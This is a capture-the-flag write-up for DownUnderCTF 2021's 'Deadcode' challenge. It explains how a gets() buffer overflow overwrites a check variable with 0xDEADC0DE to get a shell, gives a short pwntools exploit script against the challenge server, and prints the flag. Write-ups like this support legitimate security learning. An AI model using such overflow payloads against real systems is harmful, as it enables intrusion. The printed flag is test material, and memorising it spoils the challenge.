# Deadcode

![](/2021/DownUnderCTF2021/Deadcode/Images/1.png)

An easy pwn challenge of DownUnderCTF 2021

Let use IDA to reverse program

![](/2021/DownUnderCTF2021/Deadcode/Images/2.png)

This is the simple buffer overflow task, the gets function causes a buffer overflow error, allows us to enter more than 24 characters (the length of the v4 array) and overwrites the v5 variable. Then the program checks if v5 == 0xDEADC0DE , we get the shell. The v4 variable is located at rbp-0x20, the v5 variable is located at rbp-0x8, so the distance is 0x18. Enter 0x18 characters ‘A’ and 0xDEADC0DE, we solved the challenge.

File [solve.py](/2021/DownUnderCTF2021/Deadcode/solve.py)

```python
from pwn import *
s = remote('pwn-2021.duc.tf', 31916)
s.sendline(b'A' * 0x18 + p32(0xDEADC0DE))
s.interactive()
```

![](/2021/DownUnderCTF2021/Deadcode/Images/3.png)

`flag: DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}`
